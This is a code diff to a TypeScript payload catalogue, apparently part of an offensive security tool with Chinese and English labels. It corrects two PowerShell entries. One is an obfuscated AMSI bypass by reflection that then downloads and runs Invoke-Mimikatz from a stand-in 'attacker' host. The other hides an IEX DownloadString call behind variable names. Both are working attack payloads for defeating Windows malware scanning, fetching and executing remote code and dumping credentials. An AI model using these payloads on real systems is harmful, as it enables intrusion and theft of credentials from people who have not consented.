@@ -889,7 +889,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '混淆执行', en: 'ObfuscationExecute' },
-        command: `$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')`,
+        command: `$a=[Ref].Assembly.GetType('System.'+'Management.'+'Automation.AmsiUtils');$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')`,
         description: { zh: '通过反射绕过AMSI', en: 'throughReflectionBypassAMSI' }
       }
     ],
@@ -1775,7 +1775,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '混淆变量名', en: 'ObfuscationVariablename' },
-        command: `${1}='IEX'; ${2}='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "${1} ${2}"`,
+        command: `\${1}='IEX'; \${2}='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "\${1} \${2}"`,
         description: { zh: '变量名混淆', en: 'VariablenameObfuscation' },
         platform: 'windows'
       },
